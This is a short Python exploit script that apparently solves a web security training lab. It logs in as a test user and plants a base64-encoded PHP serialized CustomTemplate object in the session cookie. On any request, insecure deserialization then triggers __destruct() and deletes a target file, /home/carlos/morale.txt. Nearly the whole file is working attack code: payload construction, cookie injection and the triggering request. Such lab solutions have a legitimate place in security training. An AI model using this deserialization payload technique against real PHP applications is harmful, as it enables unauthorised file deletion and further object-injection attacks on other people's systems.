import sys
import os
import base64
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession

lab = LabSession()

lab.login("wiener", "peter")

# inject a CustomTemplate object instead of the expected User object
# the class has a __destruct() method that calls unlink() on lock_file_path
# when PHP destroys the object after deserialization, it deletes our target file
payload = 'O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}'
lab.info(f"Payload: {payload}")

cookie = base64.b64encode(payload.encode()).decode()
lab.session.cookies.set("session", cookie)

# any request with this cookie triggers deserialization -> __destruct -> unlink
lab.get("/")

lab.check_solved()
